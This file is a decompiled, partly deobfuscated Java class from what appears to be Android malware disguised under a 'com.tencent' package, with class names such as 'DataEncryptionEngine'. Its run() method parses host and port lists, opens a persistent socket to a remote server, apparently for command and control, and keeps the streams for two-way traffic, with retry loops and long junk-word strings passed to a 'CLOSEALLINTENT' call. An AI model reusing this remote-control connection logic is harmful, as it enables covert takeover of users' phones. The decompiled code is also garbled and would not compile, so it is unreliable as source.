package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: DataEncryptionEngine_1
 * Original: Lcom/tencent/tunesxconcerningn102$1;
 */
class DataEncryptionEngine_1 implements Runnable; {

    // === FIELDS ===
    final String val$F__tunesxconcerningn102_F;
    final String val$P_tunesxconcerningn102_P;

    // === METHODS ===

     void Constructor(String param0, String param1) {
        v0.val$F__tunesxconcerningn102_F = v1;
        v0.val$P_tunesxconcerningn102_P = v2;
        // new Object()
        return;
    }

    public void run() {
        v0 = v8.val$F__tunesxconcerningn102_F;
        v1 = DataPackagingEngine.t_tunesxconcerningn103_g;
        v1 = v0.split(v1);
        v1 = v8.val$P_tunesxconcerningn102_P;
        v2 = DataPackagingEngine.t_tunesxconcerningn103_g;
        v2 = v1.split(v2);
        v2 = DataEncryptionEngine.ctx;
        v3 = DataPackagingEngine.sv(v2);
        v3 = 0;
        if (v2 != null && v2 != 0) { // goto +7
        v2 = DataEncryptionEngine.ctx;
        DataPackagingEngine.WK_tunesxconcerningn103_L(v2, 0);
        v2 = v0.length;
        v4 = v1.length;
        if (v2 != v4) { // goto +132
        v2 = 0;
        v4 = 1;
        v5 = v0[v2];
        v5 = InetAddress.getByName(v5);
        DataEncryptionEngine.adre_tunesxconcerningn102_sses = v5;
        v5 = new InetSocketAddress();
        v6 = DataEncryptionEngine.adre_tunesxconcerningn102_sses;
        v7 = v1[v2];
        Integer.valueOf(v7);
        v5 = v7.intValue();
        // new InetSocketAddress(v6, v7)
        DataEncryptionEngine.sca_tunesxconcerningn102_drees = v5;
        v5 = new Socket();
        // new Socket()
        DataEncryptionEngine.rec_tunesxconcerningn102_iver = v5;
        v5 = DataEncryptionEngine.rec_tunesxconcerningn102_iver;
        v5.setSoTimeout(0);
        v5 = DataEncryptionEngine.rec_tunesxconcerningn102_iver;
        v5.setKeepAlive(1);
        v5 = DataEncryptionEngine.rec_tunesxconcerningn102_iver;
        v6 = DataEncryptionEngine.sca_tunesxconcerningn102_drees;
        v7 = 60000;
        v5.connect(v6, 60000);
        v5 = DataEncryptionEngine.rec_tunesxconcerningn102_iver;
        v5 = v5.isConnected();
        DataEncryptionEngine.q = v5;
        v5 = DataEncryptionEngine.q;
        if (v5 == null || v5 == 0) { // goto +42
        v5 = DataEncryptionEngine.rec_tunesxconcerningn102_iver;
        v6 = 204800;
        v5.setSendBufferSize(204800);
        v5 = DataEncryptionEngine.rec_tunesxconcerningn102_iver;
        v5.setReceiveBufferSize(204800);
        v5 = new DataInputStream();
        v5 = 60000.getInputStream();
        // new BufferedInputStream(60000)
        // new DataInputStream(204800)
        DataEncryptionEngine.inputnew = v5;
        v5 = DataEncryptionEngine.rec_tunesxconcerningn102_iver;
        v5 = v5.getOutputStream();
        DataEncryptionEngine.outpu_tunesxconcerningn102_tnew = v5;
        // goto (branch)
        v5 = "SDGATHShypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41HTEGKUY";
        DataEncryptionEngine.CLOSEALLINTENT("SDGATHShypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41HTEGKUY");
        // goto (branch)
        DataEncryptionEngine.CLOSEALLINTENT("ghtyjthypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41jghfd");
        v5 = 1;
        Thread.sleep(1, 204800);
        v2 = v2 + 1;
        if (v2 <= 1) { // goto +-127
        DataPackagingEngine.rel(0);
        v2 = 1000;
        Thread.sleep(1000, 0);
        if (1000 == null || 1000 == 0) { // goto +-158
        v0 = DataEncryptionEngine.q;
        if (v0 == null || v0 == 0) { // goto +5
        DataEncryptionEngine.r_tunesxconcerningn102_cv();
        return;
    }
}
